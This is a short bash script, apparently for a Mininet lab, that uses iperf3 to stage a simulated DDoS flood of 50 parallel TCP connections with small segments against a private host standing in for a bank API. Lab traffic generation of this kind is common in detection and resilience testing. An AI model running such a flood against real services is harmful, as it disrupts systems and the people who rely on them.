#!/bin/bash
# Real-time DDoS Attack using iPerf3
# To be executed on Mininet host h4

TARGET_IP="10.0.0.2"
TARGET_PORT="8855"

echo "=========================================================="
echo " 🚨 INITIATING MASSIVE IPERF3 DDoS ATTACK 🚨 "
echo "=========================================================="
echo "Target: $TARGET_IP on Port: $TARGET_PORT"
echo "Vectors: Parallel TCP Floods + High Bandwidth"

# Run iperf3 in client mode:
# -c : Client connecting to TARGET_IP
# -p : Target port 8855 (simulating Bank API port)
# -P 50 : 50 parallel connections (simulating botnet)
# -t 20 : Run for 20 seconds
# -l 64 : Small TCP segments (typical for SYN/TCP floods)

iperf3 -c $TARGET_IP -p $TARGET_PORT -P 50 -t 20 -l 64

echo "=========================================================="
echo " [+] Attack payload delivered."
echo "=========================================================="
